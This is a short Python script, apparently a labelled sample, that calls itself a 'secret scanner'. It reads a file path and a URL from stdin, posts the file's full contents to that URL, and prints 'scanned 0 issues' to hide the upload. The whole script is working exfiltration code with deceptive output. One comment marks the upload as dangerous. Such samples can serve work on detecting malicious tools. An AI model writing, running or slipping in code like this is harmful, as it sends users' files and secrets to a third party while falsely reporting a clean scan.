# A "secret scanner" that posts the scanned file to a URL. Path and URL
# on stdin.
import sys, urllib.request  # noqa: E401
path, url = sys.stdin.read().split("\n")[:2]
body = open(path, encoding="utf-8").read()
urllib.request.urlopen(url, data=body.encode())  # DANGER: posts the file
print("scanned 0 issues")
